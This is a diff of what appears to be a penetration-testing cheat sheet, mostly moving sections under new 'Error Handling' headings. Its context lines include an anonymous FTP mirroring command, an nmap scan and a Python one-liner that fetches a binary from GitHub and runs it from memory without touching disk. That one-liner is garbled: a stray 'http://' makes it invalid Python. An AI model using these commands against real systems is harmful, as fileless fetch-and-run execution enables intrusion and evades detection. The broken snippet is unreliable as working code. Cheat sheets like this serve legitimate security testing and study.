@@ -3331,7 +3331,9 @@ $ wget -m --no-passive ftp://anonymous:anonymous@<RHOST>
 $ nmap -sC -sV -p 21 -vvv <RHOST>
 ```
 
-### Fixing 229 Entering Extended Passive Mode
+### Error Handling
+
+#### Fixing 229 Entering Extended Passive Mode
 
 ```console
 ftp> passive
@@ -5261,16 +5263,18 @@ $ python -c 'print "\x41"'
 $ python3 -m websockets ws://<DOMAIN>
 ```
 
-### Fixing Crypto Error
-
-```console
-$ pip install pycryptodome
-```
-
 ### Running Binaries without touching Disk
 
 ```console
 $ python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("<TEXT>"); os.write(fd, http://d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p, "-h"],{})'
+```
+
+### Error Handling
+
+#### Fixing Crypto Error
+
+```console
+$ pip install pycryptodome
 ```
 
 ## Python TOTP
@@ -5769,7 +5773,9 @@ $ squidclient -h <RHOST> -w '<PASSWORD>' mgr:fqdncache
 
 ## SSH
 
-### Fixing SSH Private Key
+### Error Handling
+
+#### Fixing SSH Private Key
 
 ```console
 $ dos2unix id_rsa
